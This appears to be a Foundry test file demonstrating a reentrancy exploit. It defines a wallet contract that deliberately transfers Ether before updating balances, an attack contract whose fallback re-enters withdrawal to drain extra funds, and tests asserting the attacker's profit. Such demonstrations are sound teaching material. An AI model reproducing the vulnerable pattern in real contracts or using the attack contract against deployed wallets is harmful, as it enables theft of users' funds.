pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// VulnerableWallet with Unsafe Credit Transfer vulnerability
contract VulnerableWallet {
    mapping(address => uint256) public userBalances;

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    // Vulnerable withdraw function: Ether is transferred before updating state
    function withdrawBalance() public {
        uint256 amountToWithdraw = userBalances[msg.sender];
        require(amountToWithdraw > 0, "No balance to withdraw");
        (bool success, ) = msg.sender.call{value: amountToWithdraw}("");
        require(success, "Transfer failed");
        userBalances[msg.sender] = 0;
    }

    // To correctly receive Ether
    receive() external payable {}
    fallback() external payable {}
}

// Attack contract that exploits the reentrancy vulnerability
contract Attack {
    VulnerableWallet public vulnerableWallet;
    address public owner;
    uint256 public count;

    constructor(address payable _vulnerableWalletAddress) {
        vulnerableWallet = VulnerableWallet(_vulnerableWalletAddress);
        owner = msg.sender;
    }

    // Attack entry: deposit Ether then withdraw triggering reentrancy
    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        // Deposit the provided Ether into the vulnerable wallet
        vulnerableWallet.deposit{value: msg.value}();
        // Start withdrawal (vulnerable to reentrancy)
        vulnerableWallet.withdrawBalance();
    }

    // Fallback function that reenters the withdrawBalance call twice
    fallback() external payable {
        if (count < 2) {
            count++;
            vulnerableWallet.withdrawBalance();
        }
    }

    // Collect Ether accumulated in the attack contract
    function collectEther() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

// Forge test contract to demonstrate the vulnerability
contract VulnerableWalletAttackTest is Test {
    VulnerableWallet public vulnerableWallet;
    Attack public attackContract;

    // Predefined addresses for testing
    address attacker = address(0xABCD);
    address victim = address(0xBEEF);

    // Setup the environment
    function setUp() public {
        // Deploy the vulnerable wallet
        vulnerableWallet = new VulnerableWallet();

        // Fund a victim account and deposit funds into the vulnerable wallet
        vm.deal(victim, 20 ether);
        vm.prank(victim);
        vulnerableWallet.deposit{value: 10 ether}();

        // Fund the attacker account
        vm.deal(attacker, 5 ether);
        
        // Deploy the attack contract from the attacker account
        vm.prank(attacker);
        attackContract = new Attack(payable(address(vulnerableWallet)));
    }

    // Test to ensure only the owner can invoke sensitive functions in the attack contract
    function testAttackAccessControl() public {
        // Attempt to call attack() from a non-owner; should revert with "Not owner"
        vm.prank(victim);
        vm.expectRevert("Not owner");
        attackContract.attack{value: 1 ether}();

        // Attempt to call collectEther() from a non-owner; should revert with "Not owner"
        vm.prank(victim);
        vm.expectRevert("Not owner");
        attackContract.collectEther();
    }

    // Test to demonstrate the reentrancy exploit
    function testReentrancyAttack() public {
        // Record initial balances
        uint256 initialAttackerBalance = attacker.balance; // should be 5 ether from setUp
        uint256 initialWalletBalance = address(vulnerableWallet).balance; // 10 ether from victim's deposit

        // Execute the attack: attacker sends 1 ether from their account via the attack contract
        vm.prank(attacker);
        attackContract.attack{value: 1 ether}();

        // After deposit, vulnerableWallet balance becomes 10 + 1 = 11 ether.
        // The reentrancy attack triggers three withdrawals of 1 ether each, totalling 3 ether withdrawn.
        // Thus, vulnerableWallet balance should become 11 - 3 = 8 ether.

        // Withdraw funds from the attack contract to the attacker's external account
        vm.prank(attacker);
        attackContract.collectEther();

        // Check the attacker's final balance
        uint256 finalAttackerBalance = attacker.balance;
        // Attacker initially had 5 ether, spent 1 ether in the attack, but then got 3 ether back = net +2 ether profit
        assertEq(finalAttackerBalance, initialAttackerBalance + 2 ether, "Attacker profit mismatch");

        // Check the vulnerable wallet's final balance
        uint256 finalWalletBalance = address(vulnerableWallet).balance;
        // vulnerableWallet started with 10 ether, got an extra 1 ether deposit from the attacker (total 11), then 3 ether withdrawn
        // Expected final balance = 11 - 3 = 8 ether, which is 2 ether less than the initial 10 ether
        assertEq(finalWalletBalance, initialWalletBalance - 2 ether, "VulnerableWallet balance mismatch");
    }
}
